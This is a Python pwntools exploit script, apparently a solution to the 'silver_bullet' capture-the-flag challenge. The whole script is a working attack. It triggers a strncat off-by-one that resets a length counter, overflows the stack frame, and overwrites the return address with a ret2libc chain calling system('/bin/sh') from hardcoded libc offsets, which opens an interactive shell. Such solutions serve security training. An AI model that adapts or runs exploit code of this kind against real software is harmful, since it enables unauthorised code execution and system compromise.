from pwn import *

p = process('../../pwnable/silver_bullet/silver_bullet')

# 1. Fill the buffer with 45 bytes
p.recvuntil(':')
p.sendline('1')
p.recvuntil(':')
p.sendline('A'*45)

# 2. Append 3 bytes so strncat will override the bullet length with 0
# when it's actually 48 bytes + '/0'. This will result in the a new legth of 3
# (0+3) instead of 48 (45+3), allowing us to append once more and overflow.
p.recvuntil(':')
p.sendline('2')
p.recvuntil(':')
p.sendline('A'*3)

# 3. Read an additional 11 bytes and append them to the bullet description.
# Since the bullet description is stored on main's stack frame,
# we'll be able to override the return address and hiject execution.
# 
# The first 3 bytes on the input will override the high 2 bytes of the current
# length (the lower bytes will be 0x3). Those three bytes should be 0xFFFFFF
# so we'll be able to beat the wolf and have the main return.

# The next 4 bytes can be anything as they'll override the stored ebp.
# the last 4 bytes should contain our address.

libc_base_address = 0xf7dd3000
system_offset = 0x0003d7e0 # Offset on our local libc
exit_offset = 0x00030a30 # offset on our local libc
binsh_offset = 0x0017c968 # offset on our local libc

bullet_size = "\xFF\xFF\xFF"
ebp = "\x90\x90\x90\x90"
payload = bullet_size + ebp + p32(libc_base_address + system_offset)
payload += p32(libc_base_address + exit_offset)
payload += p32(libc_base_address + binsh_offset)

p.recvuntil(':')
p.sendline('2')
p.recvuntil(':')
p.sendline(payload)

p.recvuntil(':')
p.sendline('3')

p.interactive()